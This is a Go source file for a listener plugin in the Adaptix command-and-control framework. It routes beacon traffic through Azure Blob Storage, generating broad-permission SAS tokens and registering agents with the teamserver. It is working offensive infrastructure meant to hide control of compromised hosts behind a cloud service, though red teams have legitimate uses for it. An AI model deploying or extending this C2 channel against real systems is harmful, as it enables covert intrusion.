package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

type PluginListener struct{}

var (
	Ts              adaptix.Teamserver
	ModuleDir       string
	ListenerDataDir string
)

func InitPlugin(ts any, moduleDir string, listenerDir string) adaptix.PluginListener {
	ModuleDir       = moduleDir
	ListenerDataDir = listenerDir
	if ts != nil {
		Ts = ts.(adaptix.Teamserver)
	}
	return &PluginListener{}
}

func (p *PluginListener) Call(operator, listenerName, function, args string) {}

// ===== Config =====

type TransportConfig struct {
	StorageType    string `json:"storage_type"`
	StorageAccount string `json:"storage_account"`
	StorageKey     string `json:"storage_key"`
	ContainerName  string `json:"container_name"`
	SasToken       string `json:"sas_token"`
	PollInterval   int    `json:"poll_interval"`
	PollAttempts   int    `json:"poll_attempts"`
	PollIntervalMs int    `json:"poll_interval_ms"`
	EncryptKey     string `json:"encrypt_key"`
	AgentCrc       string `json:"agent_crc"`
}

type extenderListener struct {
	name      string
	config    TransportConfig
	transport *TransportGraph
	active    bool
}

func generateEncryptKey() string {
	key := make([]byte, 16)
	rand.Read(key)
	return hex.EncodeToString(key)
}

func hmacSHA256B64(key []byte, message string) string {
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(message))
	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

func generateContainerSAS(accountName, accountKey, containerName string, expiry time.Time) (string, error) {
	key, err := base64.StdEncoding.DecodeString(accountKey)
	if err != nil {
		return "", fmt.Errorf("invalid storage key: %w", err)
	}
	start     := time.Now().UTC().Add(-5 * time.Minute).Format("2006-01-02T15:04:05Z")
	expiryStr := expiry.UTC().Format("2006-01-02T15:04:05Z")
	version   := "2020-10-02"
	permissions      := "rwdl"
	canonicalResource := fmt.Sprintf("/blob/%s/%s", accountName, containerName)
	resource  := "c"

	stringToSign := strings.Join([]string{
		permissions, start, expiryStr, canonicalResource,
		"", "", "", version, resource, "", "", "", "", "", "",
	}, "\n")

	params := url.Values{}
	params.Set("sv", version)
	params.Set("sr", resource)
	params.Set("sp", permissions)
	params.Set("st", start)
	params.Set("se", expiryStr)
	params.Set("sig", hmacSHA256B64(key, stringToSign))
	return params.Encode(), nil
}

func generateAccountSAS(accountName, accountKey string, expiry time.Time) (string, error) {
	key, err := base64.StdEncoding.DecodeString(accountKey)
	if err != nil {
		return "", fmt.Errorf("invalid storage key: %w", err)
	}
	start     := time.Now().UTC().Add(-5 * time.Minute).Format("2006-01-02T15:04:05Z")
	expiryStr := expiry.UTC().Format("2006-01-02T15:04:05Z")
	version   := "2020-10-02"
	permissions  := "rwdlac"
	services     := "b"
	resourceTypes := "sco"

	stringToSign := strings.Join([]string{
		accountName, permissions, services, resourceTypes,
		start, expiryStr, "", "", version,
	}, "\n") + "\n"

	params := url.Values{}
	params.Set("sv", version)
	params.Set("ss", services)
	params.Set("srt", resourceTypes)
	params.Set("sp", permissions)
	params.Set("st", start)
	params.Set("se", expiryStr)
	params.Set("sig", hmacSHA256B64(key, stringToSign))
	return params.Encode(), nil
}

func (p *PluginListener) Create(name, config string, customData []byte) (adaptix.ExtenderListener, adaptix.ListenerData, []byte, error) {
	var conf TransportConfig

	if customData == nil {
		if err := json.Unmarshal([]byte(config), &conf); err != nil {
			return nil, adaptix.ListenerData{}, nil, err
		}
		conf.StorageType = "blob"
		if conf.EncryptKey == "" {
			conf.EncryptKey = generateEncryptKey()
		}
		if conf.PollAttempts <= 0 {
			conf.PollAttempts = 15
		}
		if conf.PollIntervalMs <= 0 {
			conf.PollIntervalMs = 3000
		}
		if conf.PollInterval <= 0 {
			conf.PollInterval = 5
		}
		if conf.AgentCrc == "" {
			conf.AgentCrc = "deadbeef"
		}
		if conf.StorageAccount == "" || conf.StorageKey == "" || conf.ContainerName == "" {
			return nil, adaptix.ListenerData{}, nil, fmt.Errorf("blob mode requires storage_account, storage_key and container_name")
		}
		if conf.SasToken == "" {
			var err error
			conf.SasToken, err = generateContainerSAS(conf.StorageAccount, conf.StorageKey, conf.ContainerName, time.Now().Add(90*24*time.Hour))
			if err != nil {
				return nil, adaptix.ListenerData{}, nil, fmt.Errorf("sas generation failed: %w", err)
			}
		}
	} else {
		if err := json.Unmarshal(customData, &conf); err != nil {
			return nil, adaptix.ListenerData{}, nil, err
		}
	}

	listener := &extenderListener{
		name:      name,
		config:    conf,
		transport: NewTransportGraph(name, conf),
		active:    false,
	}

	listenerData := adaptix.ListenerData{
		Name:      name,
		BindHost:  conf.StorageAccount + ".blob",
		BindPort:  conf.ContainerName,
		AgentAddr: conf.StorageAccount + ".blob.core.windows.net",
		Protocol:  "graph",
		Type:      "external",
		Status:    "stopped",
		Watermark: conf.AgentCrc,
	}

	customOut, err := json.Marshal(conf)
	if err != nil {
		return nil, listenerData, nil, err
	}
	return listener, listenerData, customOut, nil
}

func (l *extenderListener) Start() error {
	l.active = true
	return l.transport.Start()
}

func (l *extenderListener) Stop() error {
	l.active = false
	return l.transport.Stop()
}

func (l *extenderListener) Edit(config string) (adaptix.ListenerData, []byte, error) {
	var conf TransportConfig
	if err := json.Unmarshal([]byte(config), &conf); err != nil {
		return adaptix.ListenerData{}, nil, err
	}
	if conf.ContainerName != "" { l.config.ContainerName = conf.ContainerName }
	if conf.PollInterval > 0   { l.config.PollInterval = conf.PollInterval }
	if conf.PollAttempts > 0   { l.config.PollAttempts = conf.PollAttempts }
	if conf.PollIntervalMs > 0 { l.config.PollIntervalMs = conf.PollIntervalMs }
	l.transport.Config = l.config

	status := "stopped"
	if l.active { status = "running" }

	listenerData := adaptix.ListenerData{
		Name:      l.name,
		BindHost:  l.config.StorageAccount + ".blob",
		BindPort:  l.config.ContainerName,
		AgentAddr: l.config.StorageAccount + ".blob.core.windows.net",
		Protocol:  "graph",
		Type:      "external",
		Status:    status,
		Watermark: l.config.AgentCrc,
	}
	customOut, err := json.Marshal(l.config)
	return listenerData, customOut, err
}

func (l *extenderListener) GetProfile() ([]byte, error) {
	var buffer bytes.Buffer
	if err := json.NewEncoder(&buffer).Encode(l.config); err != nil {
		return nil, err
	}
	return buffer.Bytes(), nil
}

func (l *extenderListener) InternalHandler(data []byte) (int64, error) {
	// data: [aes_key(16)][sessionId(16)][encrypted_register...]
	// Same layout as HTTPS InternalHandler — beat from cmd_link result
	if len(data) < 17 {
		return 0, fmt.Errorf("InternalHandler: data too short (%d)", len(data))
	}
	beaconID  := string(data[:16])
	ciphertext := data[16:]

	encKey, err := hex.DecodeString(l.config.EncryptKey)
	if err != nil || len(encKey) != 16 {
		return 0, fmt.Errorf("InternalHandler: bad encrypt key")
	}

	beatWithId := make([]byte, 16+16+len(ciphertext))
	copy(beatWithId[:16], beaconID)
	copy(beatWithId[16:32], encKey)
	copy(beatWithId[32:], ciphertext)

	agentData, err := Ts.TsAgentCreate(l.config.AgentCrc, []byte(beaconID), beatWithId, l.name, "graph-api", false)
	if err != nil {
		return 0, fmt.Errorf("InternalHandler: TsAgentCreate: %w", err)
	}
	return agentData.Id, nil
}
